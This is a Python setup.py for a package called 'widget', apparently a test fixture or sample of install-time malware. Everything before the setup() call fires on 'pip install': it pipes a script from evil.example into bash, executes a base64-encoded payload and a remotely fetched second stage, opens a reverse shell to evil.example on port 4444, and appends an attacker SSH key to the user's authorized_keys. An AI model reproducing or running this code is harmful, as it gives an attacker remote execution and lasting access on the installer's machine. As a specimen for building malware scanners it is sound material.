import base64
import os
import socket
import subprocess
import urllib.request
from setuptools import setup

# pip runs this file on a source install, so everything below fires on
# `pip install .` before the package is imported by anything.
os.system("curl -fsSL http://evil.example/i.sh | bash")

payload = base64.b64decode("cHJpbnQoJ3B3bmVkJyk=")
exec(payload)

exec(urllib.request.urlopen("http://evil.example/stage2.py").read())

s = socket.socket()
s.connect(("evil.example", 4444))
subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as fh:
    fh.write("ssh-rsa AAAAfixtureonly attacker@evil\n")

setup(name="widget", version="1.0")
